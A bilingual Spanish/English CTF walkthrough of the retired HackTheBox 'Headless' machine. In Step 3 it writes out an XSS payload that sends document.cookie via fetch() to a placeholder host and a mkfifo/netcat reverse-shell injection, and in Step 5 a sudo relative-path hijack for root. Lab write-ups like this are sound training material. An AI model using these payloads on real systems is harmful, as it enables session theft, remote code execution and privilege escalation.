# Headless [Easy]

> **ES:** Máquina Linux Easy con app Python (Werkzeug) en puerto 5000; XSS reflejado para robar cookie de admin y RCE en dashboard, con privesc vía script sudo con path relativo.
> **EN:** Easy Linux box with a Python (Werkzeug) app on port 5000; reflected XSS to steal the admin cookie and RCE on the dashboard, plus privesc via a sudo script with a relative path.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Headless] |
| **URL** | https://app.hackthebox.com/machines/Headless |
| **IP lab** | 10.10.11.8 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Headless (video)](https://youtube.com/watch?v=FDCpJbS1OuQ) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía XSS + RCE en el panel y abuso de `sudo /usr/bin/syscheck`.
> **EN:** Get `user.txt` and `root.txt` via XSS + RCE on the panel and abuse of `sudo /usr/bin/syscheck`.

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] Burp Suite (interceptar POST /support)
- [ ] netcat / pwncat-cs (listener)
- [ ] python3 http.server (opcional)
- [ ] sudo -l / análisis de scripts bash

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo completo: SSH (22) y app HTTP en 5000 (Werkzeug/Python). La home redirige el botón de contacto a `/support` y hay ruta `/dashboard`.
> **EN:** Full scan: SSH (22) and an HTTP app on 5000 (Werkzeug/Python). The home page links to `/support` and a `/dashboard` route exists.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.8
curl -sI http://10.10.11.8:5000/
```

**Resultado / Result:** 22/OpenSSH, 5000/Werkzeug 2.2.2 + Python 3.11; cookie `is_admin` visible en respuestas. Imágenes de apoyo en `img/` de las notas originales.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Fuzzing del formulario de `/support`: los campos se reflejan sin sanitizar → candidato a XSS almacenado/reflejado revisado por un "admin".
> **EN:** Fuzzing the `/support` form: fields are reflected unsanitized → XSS candidate reviewed by an "admin" bot.

```bash
gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirb/common.txt
# Revisar a mano: /support , /dashboard
```

**Resultado / Result:** `/dashboard` exige cookie de admin; `/support` acepta `fname/lname/email/phone/message`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Inyectar XSS en `message` que exfiltre `document.cookie` (base64) a tu listener; con la cookie decodificada entrar a `/dashboard`, cuyo campo `date` concatena comandos → RCE.
> **EN:** Inject XSS in `message` exfiltrating `document.cookie` (base64) to your listener; with the decoded cookie enter `/dashboard`, whose `date` field concatenates commands → RCE.

```bash
nc -lvnp 9999
# Payload (conceptual, parafraseado): <img src=x onerror="fetch('http://TU-IP:9999/?'+btoa(document.cookie))">
# Tras recibir la cookie, usarla en el navegador y luego:
# date=2023-09-15;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc TU-IP 9999 >/tmp/f
```

**Resultado / Result:** Shell reversa como usuario de servicio (`dvir`) en `/home/dvir/app`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Estabilizar shell y leer `user.txt` en el home del usuario (no se publica la flag).
> **EN:** Stabilize the shell and read `user.txt` in the user's home (flag not published).

```bash
whoami; id; ls -la /home/dvir/
cat /home/dvir/user.txt  # solo en lab retirado
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` muestra `(ALL) NOPASSWD: /usr/bin/syscheck`. El script corre como root y llama a `./initdb.sh` por ruta relativa → plantar un `initdb.sh` propio en el CWD y ejecutar con sudo.
> **EN:** `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/syscheck`. The script runs as root and calls `./initdb.sh` via a relative path → plant your own `initdb.sh` in the CWD and run with sudo.

```bash
sudo -l
cat /usr/bin/syscheck
echo -e '#!/bin/bash\n/bin/bash -p' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
whoami  # root
cat /root/root.txt  # solo en lab retirado
```

**Resultado / Result:** Root por hijack de ruta relativa en script privilegiado.

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** XSS para robo de sesión cuando un bot/admin revisa el input; RCE por concatenación en parámetros de fecha; peligro de invocar sub-scripts por ruta relativa con sudo NOPASSWD.
> **EN:** XSS for session theft when a bot/admin reviews input; RCE via concatenation in date parameters; danger of invoking sub-scripts by relative path with NOPASSWD sudo.

- [ ] Exfiltración de cookies con `fetch` + base64
- [ ] Reutilización de cookie `is_admin` para rutas protegidas
- [ ] Privesc por `secure_path` + llamada relativa (`./initdb.sh`)

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `index.md` + capturas en `img/` (contenido propio previo, sin normalizar)
- **Walkthrough de referencia:** [verificar en app.hackthebox.com/machines/Headless]
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Nota original en chino/inglés migrada al molde bilingüe ES/EN; flags ofuscadas, payloads parafraseados.

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
